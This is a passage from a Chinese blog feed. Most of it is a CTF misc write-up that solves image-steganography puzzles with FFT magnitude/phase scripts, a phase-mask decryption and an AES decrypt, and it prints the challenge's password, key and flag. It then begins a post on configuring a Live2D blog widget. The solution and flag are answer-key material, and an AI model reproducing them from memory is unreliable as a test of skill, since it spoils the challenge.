class="title">fft</span>(<span class="params">img</span>):</span></span><br><span class="line">    fft = np.fft.fft2(img)</span><br><span class="line">    fft = np.fft.fftshift(fft)</span><br><span class="line">    m = np.log(np.<span class="built_in">abs</span>(fft))</span><br><span class="line">    p = np.angle(fft)</span><br><span class="line">    <span class="keyword">return</span> m, p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.mkdir(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">    os.mkdir(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">    os.mkdir(<span class="string">&#x27;frame&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;ffmpeg -i secret.mp4 frame/%03d.png&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    files = os.listdir(<span class="string">&#x27;frame&#x27;</span>)</span><br><span class="line">    r_file = <span class="built_in">open</span>(<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        img = cv2.imread(<span class="string">f&#x27;frame/<span class="subst">&#123;file&#125;</span>&#x27;</span>, cv2.IMREAD_GRAYSCALE)</span><br><span class="line"></span><br><span class="line">        m, p = fft(img)</span><br><span class="line">        r_file.write(struct.pack(<span class="string">&#x27;!ff&#x27;</span>, m.<span class="built_in">min</span>(), m.<span class="built_in">max</span>()))</span><br><span class="line"></span><br><span class="line">        new_img1 = mapping(m)</span><br><span class="line">        new_img2 = mapping(p)</span><br><span class="line"></span><br><span class="line">        cv2.imwrite(<span class="string">f&#x27;m/<span class="subst">&#123;file&#125;</span>&#x27;</span>, new_img1)</span><br><span class="line">        cv2.imwrite(<span class="string">f&#x27;p/<span class="subst">&#123;file&#125;</span>&#x27;</span>, new_img2)</span><br><span class="line"></span><br><span class="line">    r_file.close()</span><br><span class="line">    os.system(<span class="string">&#x27;ffmpeg -i m/%03d.png -r 25 -vcodec png 1.mkv&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;ffmpeg -i p/%03d.png -r 25 -vcodec png 2.mkv&#x27;</span>)</span><br></pre></td></tr></table></figure><p>好了，逆向手老本行，勤勤恳恳写逆算法.jpg（一些注释写代码里了）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#事先创建m,p,frame三个文件夹，先按25帧生成这两个文件夹的图片</span></span><br><span class="line">os.system(<span class="string">&#x27;ffmpeg -i 1.mkv -r 25 m/%03d.png&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;ffmpeg -i 2.mkv -r 25 p/%03d.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#用幅度谱和相位谱 双谱重构得到原图</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ifft</span>(<span class="params">m,p,imgsize</span>):</span></span><br><span class="line">    s1=np.exp(m)</span><br><span class="line">    s1_angle=p</span><br><span class="line">    s1_real=s1*np.cos(s1_angle)</span><br><span class="line">    s1_imag=s1*np.sin(s1_angle)</span><br><span class="line">    s2=np.zeros(imgsize,dtype=<span class="built_in">complex</span>)</span><br><span class="line">    s2.real=np.array(s1_real)</span><br><span class="line">    s2.imag=np.array(s1_imag)</span><br><span class="line">    f2shift=np.fft.ifftshift(s2)</span><br><span class="line">    img_back=np.fft.ifft2(f2shift)</span><br><span class="line">    img_back=np.<span class="built_in">abs</span>(img_back)</span><br><span class="line">    <span class="keyword">return</span> img_back</span><br><span class="line"></span><br><span class="line"><span class="comment">#mapping的逆映射</span></span><br><span class="line"><span class="comment">#源码中有保存原每一个m数组的最大最小值，unpack以后是元组，直接传入就可</span></span><br><span class="line"><span class="comment">#p的还原是根据相位角的范围为（0,2*pi）来定data_min、data_max</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rev_mapping</span>(<span class="params">new_data,t=(<span class="params"></span>),down=<span class="number">0</span>,up=<span class="number">255</span></span>):</span></span><br><span class="line">    new_data=new_data.astype(np.float64)</span><br><span class="line">    <span class="keyword">if</span> t==():</span><br><span class="line">        data_max=<span class="number">2</span>*np.pi</span><br><span class="line">        data_min=<span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data_max=t[<span class="number">1</span>]</span><br><span class="line">        data_min=t[<span class="number">0</span>]</span><br><span class="line">    interval=data_max-data_min</span><br><span class="line">    new_interval=up-down</span><br><span class="line">    data=(new_data-down)*interval/new_interval+data_min</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">file1=os.listdir(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">file2=os.listdir(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">unpack=[]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        s=f.read(<span class="number">8</span>)</span><br><span class="line">        unpack.append(struct.unpack(<span class="string">&#x27;!ff&#x27;</span>,s)) <span class="comment">#unpack包装的r</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    img1=cv2.imread(<span class="string">f&#x27;m/<span class="subst">&#123;file1[i]&#125;</span>&#x27;</span>, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">    img2=cv2.imread(<span class="string">f&#x27;p/<span class="subst">&#123;file2[i]&#125;</span>&#x27;</span>, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">    m=rev_mapping(img1,unpack[i])</span><br><span class="line">    p=rev_mapping(img2)</span><br><span class="line">    new_img=ifft(m,p,img1.shape)</span><br><span class="line">    cv2.imwrite(<span class="string">f&#x27;frame/<span class="subst">&#123;file1[i]&#125;</span>&#x27;</span>,new_img)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;ffmpeg -i frame/%03d.png -r 25 secret.mp4&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后能得到一个<code>secret.mp4</code>，得到了压缩包密码。</p><p><img src="/p/wpFor-2021RedHat-PicPic/image-20210509230949783.png"></p><p><img src="/p/wpFor-2021RedHat-PicPic/image-20210509231005024.png"></p><p><strong>zs6hmdlq5ohav5l1</strong></p><h1 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h1><p>查看<code>hint.txt</code>可以看到：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mrow</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>&#123;<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mtable</span>&gt;</span><span class="tag">&lt;<span class="name">mtr</span>&gt;</span><span class="tag">&lt;<span class="name">mtd</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>A<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>cos<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>⁡<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>(<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>m<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>x<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>+<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>n<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>)<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;/<span class="name">mtd</span>&gt;</span><span class="tag">&lt;/<span class="name">mtr</span>&gt;</span><span class="tag">&lt;<span class="name">mtr</span>&gt;</span><span class="tag">&lt;<span class="name">mtd</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>B<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>cos<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>⁡<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>(<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>p<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>x<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>+<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>q<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>)<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;/<span class="name">mtd</span>&gt;</span><span class="tag">&lt;/<span class="name">mtr</span>&gt;</span><span class="tag">&lt;/<span class="name">mtable</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span><span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;/<span class="name">mrow</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>⟶<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mrow</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>&#123;<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mtable</span>&gt;</span><span class="tag">&lt;<span class="name">mtr</span>&gt;</span><span class="tag">&lt;<span class="name">mtd</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>A<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>cos<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>⁡<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>(<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>p<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>x<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>+<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>q<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>)<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;/<span class="name">mtd</span>&gt;</span><span class="tag">&lt;/<span class="name">mtr</span>&gt;</span><span class="tag">&lt;<span class="name">mtr</span>&gt;</span><span class="tag">&lt;<span class="name">mtd</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>B<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>cos<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>⁡<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>(<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>m<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>x<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>+<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span>n<span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span>)<span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;/<span class="name">mtd</span>&gt;</span><span class="tag">&lt;/<span class="name">mtr</span>&gt;</span><span class="tag">&lt;/<span class="name">mtable</span>&gt;</span><span class="tag">&lt;<span class="name">mo</span>&gt;</span><span class="tag">&lt;/<span class="name">mo</span>&gt;</span><span class="tag">&lt;/<span class="name">mrow</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查了一下是Mathematical Markup Language (MathML)，在<a href="https://www.runoob.com/try/try.php?filename=tryhtml_intro">菜鸟教程在线编辑器</a>跑一下可以看到：</p><p><img src="/p/wpFor-2021RedHat-PicPic/image-20210509231709287.png"></p><p>然后写上一关的逆算法的时候看到过<a href="https://blog.csdn.net/qq_28368377/article/details/104570526">两幅图像幅度谱和相位谱替换_陨星落云的博客-CSDN博客</a>，联想到这个式子有点幅度谱和相位谱交换的味道，所以直接把文章里的脚本拿来用，秒解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magnitude_phase_split</span>(<span class="params">img</span>):</span></span><br><span class="line">    <span class="comment"># 分离幅度谱与相位谱</span></span><br><span class="line">    dft = np.fft.fft2(img)</span><br><span class="line">    dft_shift = np.fft.fftshift(dft)</span><br><span class="line">    <span class="comment"># 幅度谱</span></span><br><span class="line">    magnitude_spectrum = np.<span class="built_in">abs</span>(dft_shift)</span><br><span class="line">    <span class="comment"># 相位谱</span></span><br><span class="line">    phase_spectrum = np.angle(dft_shift)</span><br><span class="line">    <span class="keyword">return</span> magnitude_spectrum,phase_spectrum </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magnitude_phase_combine</span>(<span class="params">img_m,img_p</span>):</span></span><br><span class="line">    <span class="comment"># 幅度谱与相位谱结合</span></span><br><span class="line">    img_mandp = img_m*np.e**(<span class="number">1j</span>*img_p)</span><br><span class="line">    img_mandp = np.uint8(np.<span class="built_in">abs</span>(np.fft.ifft2(img_mandp)))</span><br><span class="line">    img_mandp =img_mandp/np.<span class="built_in">max</span>(img_mandp)*<span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> img_mandp</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 读取图像</span></span><br><span class="line">img1 = cv2.imread(<span class="string">&quot;mix1.png&quot;</span>,<span class="number">0</span>)</span><br><span class="line">img2= cv2.imread(<span class="string">&quot;mix2.png&quot;</span>,<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 分离幅度谱与相位谱</span></span><br><span class="line">img1_m,img1_p = magnitude_phase_split(img1)</span><br><span class="line">img2_m,img2_p = magnitude_phase_split(img2)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 合并幅度谱与相位谱</span></span><br><span class="line"><span class="comment"># 将苹果图像的幅度谱与橘子图像的相位谱结合</span></span><br><span class="line">img_1mAnd2p = magnitude_phase_combine(img1_m,img2_p)</span><br><span class="line"><span class="comment"># 将橘子图像的幅度谱与苹果图像的相位谱结合</span></span><br><span class="line">img_2mAnd1p = magnitude_phase_combine(img2_m,img1_p)</span><br><span class="line"> </span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br><span class="line">plt.subplot(<span class="number">221</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">plt.imshow(img1,cmap=<span class="string">&quot;gray&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">222</span>)</span><br><span class="line">plt.imshow(img2,cmap=<span class="string">&quot;gray&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">223</span>)</span><br><span class="line">plt.imshow(img_1mAnd2p,cmap=<span class="string">&quot;gray&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;1m+2p&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">224</span>)</span><br><span class="line">plt.imshow(img_2mAnd1p,cmap=<span class="string">&quot;gray&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;2m+1p&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>就能看到：</p><p><img src="/p/wpFor-2021RedHat-PicPic/image-20210509232712560.png"></p><p>扫一下左下二维码能得到文本：<code>0f88b8529ab6c0dd2b5ceefaa1c5151aa207da114831b371ddcafc74cf8701c1d3318468d50e4b1725179d1bc04b251f</code></p><h1 id="final-challenge"><a href="#final-challenge" class="headerlink" title="final challenge"></a>final challenge</h1><blockquote><p>被上个challenge的那一串文本误导了，一直以为是用来解密图片的密钥啥的，结果白白卡了三个多小时（菜鸡落泪</p></blockquote><p>中间查了n多资料就不细说了（</p><p>总之最后拿<a href="https://blog.csdn.net/isyiming/article/details/80390684">相位掩膜+傅立叶变换进行图像加密_isyiming的博客-CSDN博客</a>的脚本改了一下：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">I=imread(<span class="string">&#x27;phase.png&#x27;</span>);<span class="comment">% 载入图像</span></span><br><span class="line">A=im2double(I);<span class="comment">% 将图像转为double格式</span></span><br><span class="line"><span class="built_in">figure</span>,imshow(A);title(<span class="string">&#x27;The original image&#x27;</span>);<span class="comment">% 显示图像</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">%加密部分</span></span><br><span class="line">Y=fftshift(A);<span class="comment">% 傅立叶变换部分调整整幅图像，将零频点移到频谱的中间</span></span><br><span class="line"><span class="built_in">figure</span>,imshow(Y);title(<span class="string">&#x27;shifted image&#x27;</span>);<span class="comment">%显示</span></span><br><span class="line">B=fft2(Y);<span class="comment">% 二维傅立叶变换</span></span><br><span class="line"><span class="built_in">figure</span>,imshow(B);title(<span class="string">&#x27;FFT imagea&#x27;</span>);<span class="comment">%显示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%M1=rand(255/255);% 随机生成密钥</span></span><br><span class="line">M1=<span class="number">0.814</span><span class="comment">%这里你自己更改你想要的值，只要是0～1范围内就好</span></span><br><span class="line"></span><br><span class="line">M11=<span class="built_in">exp</span>(<span class="built_in">i</span>*<span class="number">2</span>*<span class="built_in">pi</span>*M1);<span class="comment">%M11为根据随机相位生成的图像掩膜</span></span><br><span class="line">M111=B.*M11; <span class="comment">%将要加密的图像和掩膜相乘</span></span><br><span class="line"><span class="built_in">figure</span>,imshow(M111);title(<span class="string">&#x27;phase mask&#x27;</span>);<span class="comment">%显示加密图像</span></span><br><span class="line"></span><br><span class="line">D=fft2(M111); <span class="comment">% 再次傅立叶变换</span></span><br><span class="line"><span class="built_in">figure</span>,imshow(D);title(<span class="string">&#x27;FFT image b&#x27;</span>);</span><br><span class="line"></span><br><span class="line">C=<span class="built_in">abs</span>(D);<span class="comment">%对经过两次傅立叶变化的图像像素灰度取绝对值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%解密部分</span></span><br><span class="line">C1=ifft2(C); <span class="comment">% 二维傅立叶逆变换</span></span><br><span class="line"><span class="built_in">figure</span>,imshow(C1);title(<span class="string">&#x27;2-D IFFT b&#x27;</span>);<span class="comment">%显示进行一次傅立叶逆变换的图像</span></span><br><span class="line">C11=C1.*<span class="built_in">exp</span>(-<span class="built_in">i</span>*<span class="number">2</span>*<span class="built_in">pi</span>*M1); <span class="comment">% 移除掩膜，这个M1就是信息发送方和接收方事先约定好的密钥，接收加密图像的人必须知道M1才能正确解密。</span></span><br><span class="line"><span class="comment">%这个程序只是演示加密解密过程，就随机生成的M1，不然应该是有一个密钥文件记录M1，双方保留。</span></span><br><span class="line"><span class="built_in">figure</span>,imshow(C11);title(<span class="string">&#x27;remove mask&#x27;</span>);<span class="comment">%显示移除掩膜后的图像</span></span><br><span class="line">C111=ifft2(C11); <span class="comment">%二维傅立叶逆变换</span></span><br><span class="line"><span class="built_in">figure</span>,imshow(C111);title(<span class="string">&#x27;2-D IFFT a&#x27;</span>);<span class="comment">%显示去除掩膜和进行两次傅立叶变换的图像</span></span><br><span class="line">C1111=ifftshift(C111); <span class="comment">%将零频点还原到原始位置</span></span><br><span class="line">F=<span class="built_in">abs</span>(C1111); <span class="comment">%取绝对值</span></span><br><span class="line"><span class="built_in">figure</span>,imshow(F);title(<span class="string">&#x27;The decrypted image&#x27;</span>);<span class="comment">%显示，得到了最终解密后到图像</span></span><br></pre></td></tr></table></figure><p>就能看到其中一张图（<code>phase mask</code>）是：</p><p><img src="/p/wpFor-2021RedHat-PicPic/image-20210509234416992.png"></p><p>好像是没分离好（等其他大佬的wp），不过能大概辨认出key是<code>a8bms0v4qer3wgd67ofjhyxku5pi1czl</code></p><p>（其实是用AES解密脚本试的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">key=<span class="string">b&quot;a8bms0v4qer3wgd67ofjhyxku5pi1czl&quot;</span></span><br><span class="line">aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">cipher=binascii.unhexlify(<span class="string">&quot;0f88b8529ab6c0dd2b5ceefaa1c5151aa207da114831b371ddcafc74cf8701c1d3318468d50e4b1725179d1bc04b251f&quot;</span>)</span><br><span class="line">text=aes.decrypt(cipher)</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure><p>就能得到flag：<strong>flag{1ba48c8b-4eca-46aa-8216-d164538af310}</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的自定义多交互live2d折腾经历</title>
      <link href="p/blogsFor-My-twisty-experience-on-Live2d/"/>
      <url>p/blogsFor-My-twisty-experience-on-Live2d/</url>
      
        <content type="html"><![CDATA[<p>在<a href="https://m0d1.top/">@m0d1</a> 大佬的督促(?)下有了这篇复盘。不过因为可能很多地方讲得不全面+理解不够深入，故不打算把这篇当成是教程&#x2F;指南，那就算是一个指北吧&#x3D; &#x3D;</p><p>（划重点：不是教程！不是教程！不是教程！ </p><p>省流简介：机缘巧合之下看到了<a href="https://github.com/stevenjoezhang/live2d-widget">stevenjoezhang&#x2F;live2d-widget</a>的多交互live2d，有点心动但是模型太少不太合口味；又是一个机缘巧合之下看到了<a href="https://github.com/Eikanya/Live2d-model">Eikanya&#x2F;Live2d-model</a>中有收集解包食物语的live2d模型，发现了本命菜，顿时动力++，感觉能结合live2d-widget提供的cdn&#x2F;api接口来将心仪的模型导入进去，折腾两个晚上终于成功了呜呜呜呜呜。</p><a id="more"></a><p>效果见我的个人hexo博客：<a href="https://c10udlnk.top/">https://c10udlnk.top/</a></p><p>P.S. 本篇指北面向melody主题（<a href="https://github.com/Molunerfinn/hexo-theme-melody">Molunerfinn&#x2F;hexo-theme-melody: A simple &amp; beautiful &amp; fast theme for Hexo.</a>）。</p><p>本篇指北涉及的Github项目：</p><ul><li><p><a href="https://github.com/EYHN/hexo-helper-live2d">EYHN&#x2F;hexo-helper-live2d: Add the Sseexxyyy live2d to your hexo!</a></p></li><li><p><a href="https://github.com/stevenjoezhang/live2d-widget">stevenjoezhang&#x2F;live2d-widget: 把萌萌哒的看板娘抱回家 (ノ≧∇≦)ノ | Live2D widget for web platform</a></p></li><li><p><a href="https://github.com/fghrsh/live2d_api">fghrsh&#x2F;live2d_api: Live2D 看板娘插件 (https://www.fghrsh.net/post/123.html) 上使用的后端 API</a></p></li><li><p><a href="https://github.com/Eikanya/Live2d-model">Eikanya&#x2F;Live2d-model: Live2d model collection</a></p></li></ul><h1 id="模型准备"><a href="#模型准备" class="headerlink" title="模型准备"></a>模型准备</h1><h2 id="使用前人整理的模型"><a href="#使用前人整理的模型" class="headerlink" title="使用前人整理的模型"></a>使用前人整理的模型</h2><p>指路：<a href="https://github.com/Eikanya/Live2d-model">Eikanya&#x2F;Live2d-model: Live2d model collection</a></p><p>这里收集了提取自各种手游的live2d模型，强烈安利！</p><p>食用方法在对应文件夹里，这里我用的是他的食物语包（食物语的美工我疯狂吹好吗！），文件夹内说明是由于没有配置文件需要在想用的模型文件夹内自行配置<code>.model.json</code>，具体在各项应该填什么都写在下面代码的注释里了。</p><p><img src="/p/blogsFor-My-twisty-experience-on-Live2d/image-20210502123326566.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 